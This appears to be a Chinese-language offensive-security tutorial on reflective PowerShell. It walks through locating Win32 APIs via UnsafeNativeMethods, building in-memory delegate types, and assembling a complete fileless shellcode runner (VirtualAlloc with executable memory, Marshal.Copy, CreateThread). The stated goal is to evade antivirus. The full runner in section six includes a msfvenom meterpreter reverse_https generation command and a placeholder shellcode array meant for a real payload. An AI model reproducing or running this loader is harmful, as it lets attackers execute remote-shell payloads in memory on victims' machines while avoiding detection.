# 反射式 PowerShell - 完整反射实现

## 写在前面

本节是反射技术的核心内容。我们将从零开始，一步步构建一个完全在内存中执行的 Shellcode Runner，不使用 Add-Type，不写入任何文件到磁盘。

**Web 安全类比**：
- 这就像是在浏览器中使用 `eval()` 动态执行代码，而不是加载外部 JS 文件
- 反射就像是 JavaScript 中的原型链查找，可以访问"隐藏"的方法

## 第一部分：Add-Type 的问题

### 1.1 Add-Type 会写入磁盘

当我们使用 Add-Type 时，PowerShell 会：

```
Add-Type $CSharpCode
    │
    ├── 1. 将 C# 代码写入临时文件
    │      路径: C:\Users\xxx\AppData\Local\Temp\xxxxxxxx.cs
    │
    ├── 2. 调用 csc.exe (C# 编译器) 编译
    │      生成: xxxxxxxx.dll
    │
    └── 3. 加载 DLL 到进程
           然后删除临时文件
```

### 1.2 使用 Process Monitor 验证

```powershell
# 运行这段代码，同时用 Process Monitor 监控
$code = @"
using System;
public class Test {
    public static void Hello() {
        Console.WriteLine("Hello");
    }
}
"@
Add-Type $code
```

Process Monitor 会显示：
- `CreateFile` - 创建 .cs 文件
- `WriteFile` - 写入 C# 代码
- `CreateFile` - 创建 .dll 文件
- `WriteFile` - 写入编译后的代码

### 1.3 查看加载的程序集

```powershell
# 查看当前进程加载的所有程序集
[AppDomain]::CurrentDomain.GetAssemblies() |
    Sort-Object -Property FullName |
    Format-Table FullName

# 输出示例（注意随机名称的程序集）：

# ...
```

**问题**：这些临时文件可能被杀软检测到！

## 第二部分：反射技术原理

### 2.1 什么是反射？

反射（Reflection）是 .NET 的一个特性，允许程序在运行时：
- 检查类型信息
- 动态创建对象
- 调用方法（包括私有方法）
- 访问属性和字段

### 2.2 反射的核心思想

```
传统方法：
    编写代码 → 编译 → 执行

反射方法：
    在运行时 → 查找已存在的代码 → 动态调用
```

### 2.3 为什么反射可以避免磁盘写入？

因为我们不需要编译新代码，而是：
1. 在已加载的 .NET 程序集中查找现有的方法
2. 动态创建委托类型（在内存中）
3. 直接调用找到的方法

## 第三部分：查找 Win32 API 地址

### 3.1 关键 API：GetModuleHandle 和 GetProcAddress

要动态查找任意 Win32 API 的地址，我们需要两个函数：

| 函数 | 作用 |
|------|------|
| `GetModuleHandle` | 获取 DLL 的基地址 |
| `GetProcAddress` | 获取函数在 DLL 中的地址 |

### 3.2 在 .NET 中查找这些函数

好消息：这两个函数已经存在于 .NET 的 `System.dll` 中！

```powershell
# 搜索包含 "Unsafe" 的类型
$Assemblies = [AppDomain]::CurrentDomain.GetAssemblies()

$Assemblies |
  ForEach-Object {
    $_.GetTypes() |
      ForEach-Object {
          $_ | Get-Member -Static | Where-Object {
            $_.TypeName.Contains('Unsafe')
          }
      } 2> $null
    }
```

输出会显示 `Microsoft.Win32.UnsafeNativeMethods` 类包含我们需要的方法。

### 3.3 定位 System.dll 中的方法

```powershell
# 获取 System.dll 程序集的引用
$systemdll = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object {
        $_.GlobalAssemblyCache -And
        $_.Location.Split('\\')[-1].Equals('System.dll')
    })

# 获取 UnsafeNativeMethods 类型
$unsafeObj = $systemdll.GetType('Microsoft.Win32.UnsafeNativeMethods')

# 获取 GetModuleHandle 方法
$GetModuleHandle = $unsafeObj.GetMethod('GetModuleHandle')
```

### 3.4 调用 GetModuleHandle

```powershell
# 使用 Invoke 调用 GetModuleHandle
# 参数1: $null (静态方法不需要实例)
# 参数2: 参数数组 (DLL 名称)
$user32Base = $GetModuleHandle.Invoke($null, @("user32.dll"))

Write-Host "user32.dll 基地址: $user32Base"
# 输出: user32.dll 基地址: 140727169908736
# 转换为十六进制: 0x7FFD98F90000
```

### 3.5 处理 GetProcAddress 的多个实例

```powershell
# GetProcAddress 有多个重载，需要特殊处理
$tmp = @()
$unsafeObj.GetMethods() | ForEach-Object {
    If($_.Name -eq "GetProcAddress") {
        $tmp += $_
    }
}
$GetProcAddress = $tmp[0]

# 调用 GetProcAddress 获取 MessageBoxA 的地址
$msgBoxAddr = $GetProcAddress.Invoke($null, @($user32Base, "MessageBoxA"))
Write-Host "MessageBoxA 地址: $msgBoxAddr"
```

### 3.6 封装成 LookupFunc 函数

```powershell
function LookupFunc {
    Param ($moduleName, $functionName)

    # 获取 System.dll 中的 UnsafeNativeMethods
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object {
            $_.GlobalAssemblyCache -And
            $_.Location.Split('\\')[-1].Equals('System.dll')
        }).GetType('Microsoft.Win32.UnsafeNativeMethods')

    # 获取所有 GetProcAddress 方法
    $tmp = @()
    $assem.GetMethods() | ForEach-Object {
        If($_.Name -eq "GetProcAddress") {
            $tmp += $_
        }
    }

    # 调用 GetModuleHandle 获取模块基地址
    # 然后调用 GetProcAddress 获取函数地址
    return $tmp[0].Invoke(
        $null,
        @(
            ($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)),
            $functionName
        )
    )
}

# 使用示例
$msgBoxAddr = LookupFunc user32.dll MessageBoxA
Write-Host "MessageBoxA 地址: $msgBoxAddr"
```

## 第四部分：创建委托类型

### 4.1 什么是委托类型？

委托类型（Delegate Type）是 .NET 中的函数指针，定义了：
- 函数的参数类型
- 函数的返回类型

```csharp
// C# 中的委托声明
delegate int MessageBoxDelegate(IntPtr hWnd, String text, String caption, int options);
```

### 4.2 为什么需要委托类型？

我们已经有了函数地址，但要调用它，需要告诉 .NET：
- 这个函数接受什么参数
- 这个函数返回什么类型

### 4.3 动态创建委托类型

由于 PowerShell 没有 `delegate` 关键字，我们需要使用反射动态创建：

```powershell
function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,  # 参数类型数组
        [Parameter(Position = 1)] [Type] $delType = [Void]           # 返回类型
    )

    # 步骤 1: 创建动态程序集
    $type = [AppDomain]::CurrentDomain.
        DefineDynamicAssembly(
            (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
            [System.Reflection.Emit.AssemblyBuilderAccess]::Run  # 只在内存中运行
        ).
        # 步骤 2: 创建动态模块
        DefineDynamicModule('InMemoryModule', $false).
        # 步骤 3: 定义委托类型
        DefineType(
            'MyDelegateType',
            'Class, Public, Sealed, AnsiClass, AutoClass',
            [System.MulticastDelegate]
        )

    # 步骤 4: 定义构造函数
    $type.
        DefineConstructor(
            'RTSpecialName, HideBySig, Public',
            [System.Reflection.CallingConventions]::Standard,
            $func  # 参数类型
        ).
        SetImplementationFlags('Runtime, Managed')

    # 步骤 5: 定义 Invoke 方法
    $type.
        DefineMethod(
            'Invoke',
            'Public, HideBySig, NewSlot, Virtual',
            $delType,  # 返回类型
            $func      # 参数类型
        ).
        SetImplementationFlags('Runtime, Managed')

    # 步骤 6: 创建并返回类型
    return $type.CreateType()
}
```

### 4.4 代码详解

#### 创建动态程序集

```powershell
[AppDomain]::CurrentDomain.DefineDynamicAssembly(
    (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run  # 关键：只在内存中运行！
)
```

- `AssemblyBuilderAccess::Run` 表示程序集只在内存中运行，不保存到磁盘

#### 定义委托类型

```powershell
DefineType(
    'MyDelegateType',                    # 类型名称
    'Class, Public, Sealed, AnsiClass, AutoClass',  # 属性
    [System.MulticastDelegate]           # 基类
)
```

- 继承自 `MulticastDelegate` 使其成为委托类型

#### 定义构造函数和 Invoke 方法

```powershell
# 构造函数定义参数类型
DefineConstructor(..., $func)  # $func 是参数类型数组

# Invoke 方法定义返回类型和参数类型
DefineMethod('Invoke', ..., $delType, $func)
```

## 第五部分：调用 Win32 API

### 5.1 使用 GetDelegateForFunctionPointer

现在我们有了：
- 函数地址（通过 LookupFunc）
- 委托类型（通过 getDelegateType）

可以使用 `GetDelegateForFunctionPointer` 将它们绑定：

```powershell
# 获取 MessageBoxA 地址
$MessageBoxA = LookupFunc user32.dll MessageBoxA

# 创建委托类型
# MessageBoxA 参数: IntPtr hWnd, String text, String caption, int options
# 返回类型: int
$MessageBoxDelegate = getDelegateType @([IntPtr], [String], [String], [int]) ([int])

# 绑定地址和委托类型
$MessageBox = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    $MessageBoxA,
    $MessageBoxDelegate
)

# 调用！
$MessageBox.Invoke([IntPtr]::Zero, "Hello World", "This is My MessageBox", 0)
```

### 5.2 简化写法

可以将所有步骤合并成一行：

```powershell
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc user32.dll MessageBoxA),
    (getDelegateType @([IntPtr], [String], [String], [int]) ([int]))
).Invoke([IntPtr]::Zero, "Hello World", "Test", 0)
```

## 第六部分：完整的反射式 Shellcode Runner

### 6.1 完整代码

```powershell
# ============================================================
# 反射式 PowerShell Shellcode Runner
# 完全内存执行，无文件落地
# ============================================================

# ==================== LookupFunc 函数 ====================
function LookupFunc {
    Param ($moduleName, $functionName)

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object {
            $_.GlobalAssemblyCache -And
            $_.Location.Split('\\')[-1].Equals('System.dll')
        }).GetType('Microsoft.Win32.UnsafeNativeMethods')

    $tmp = @()
    $assem.GetMethods() | ForEach-Object {
        If($_.Name -eq "GetProcAddress") {
            $tmp += $_
        }
    }

    return $tmp[0].Invoke($null, @(
        ($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)),
        $functionName
    ))
}

# ==================== getDelegateType 函数 ====================
function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )

    $type = [AppDomain]::CurrentDomain.
        DefineDynamicAssembly(
            (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
            [System.Reflection.Emit.AssemblyBuilderAccess]::Run
        ).
        DefineDynamicModule('InMemoryModule', $false).
        DefineType(
            'MyDelegateType',
            'Class, Public, Sealed, AnsiClass, AutoClass',
            [System.MulticastDelegate]
        )

    $type.
        DefineConstructor(
            'RTSpecialName, HideBySig, Public',
            [System.Reflection.CallingConventions]::Standard,
            $func
        ).
        SetImplementationFlags('Runtime, Managed')

    $type.
        DefineMethod(
            'Invoke',
            'Public, HideBySig, NewSlot, Virtual',
            $delType,
            $func
        ).
        SetImplementationFlags('Runtime, Managed')

    return $type.CreateType()
}

# ==================== 主代码 ====================

# 1. 分配内存 (VirtualAlloc)
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll VirtualAlloc),
    (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

# 2. Shellcode (替换为你的 shellcode)
# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=443 -f ps1
[Byte[]] $buf = @(0xfc,0x48,0x83,0xe4,0xf0,0xe8)  # 实际使用时替换为完整 shellcode

# 3. 复制 shellcode 到分配的内存
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

# 4. 创建线程执行 shellcode (CreateThread)
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll CreateThread),
    (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
).Invoke([IntPtr]::Zero, 0, $lpMem, [IntPtr]::Zero, 0, [IntPtr]::Zero)

# 5. 等待线程执行完成 (WaitForSingleObject)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll WaitForSingleObject),
    (getDelegateType @([IntPtr], [Int32]) ([Int]))
).Invoke($hThread, 0xFFFFFFFF)
```

### 6.2 代码流程图

```
┌─────────────────────────────────────────────────────────────┐
│  1. LookupFunc("kernel32.dll", "VirtualAlloc")              │
│     → 在 System.dll 中查找 GetModuleHandle 和 GetProcAddress │
│     → 获取 VirtualAlloc 的内存地址                          │
└─────────────────────────────────┬───────────────────────────┘
                                  │
                                  ▼
┌─────────────────────────────────────────────────────────────┐
│  2. getDelegateType(@([IntPtr], [UInt32], ...) ([IntPtr]))  │
│     → 在内存中创建动态程序集                                │
│     → 定义委托类型（函数原型）                              │
└─────────────────────────────────┬───────────────────────────┘
                                  │
                                  ▼
┌─────────────────────────────────────────────────────────────┐
│  3. GetDelegateForFunctionPointer(地址, 委托类型)           │
│     → 将函数地址和委托类型绑定                              │
│     → 返回可调用的委托对象                                  │
└─────────────────────────────────┬───────────────────────────┘
                                  │
                                  ▼
┌─────────────────────────────────────────────────────────────┐
│  4. .Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)           │
│     → 调用 VirtualAlloc 分配可执行内存                      │
│     → 返回内存地址 $lpMem                                   │
└─────────────────────────────────┬───────────────────────────┘
                                  │
                                  ▼
┌─────────────────────────────────────────────────────────────┐
│  5. Marshal.Copy($buf, 0, $lpMem, $buf.length)              │
│     → 复制 shellcode 到分配的内存                           │
└─────────────────────────────────┬───────────────────────────┘
                                  │
                                  ▼
┌─────────────────────────────────────────────────────────────┐
│  6. CreateThread → 创建线程执行 shellcode                   │
│  7. WaitForSingleObject → 等待线程完成                      │
└─────────────────────────────────────────────────────────────┘
```

## 第九部分：常见问题

### 9.1 为什么要用 System.dll 中的方法？

因为 `System.dll` 是 .NET 的核心库，在所有 PowerShell 进程中都已加载，我们可以直接使用其中的方法，无需加载新的程序集。

### 9.2 为什么 GetProcAddress 有多个实例？

`GetProcAddress` 有多个重载版本，接受不同类型的参数。我们使用第一个版本，它接受 `IntPtr` 和 `String` 参数。

### 9.3 委托类型为什么要继承 MulticastDelegate？

`MulticastDelegate` 是 .NET 中所有委托的基类，继承它可以让我们的自定义类型被识别为委托类型。

### 9.4 为什么使用 AssemblyBuilderAccess::Run？

这个选项告诉 .NET 程序集只在内存中运行，不保存到磁盘，这是实现无文件落地的关键。
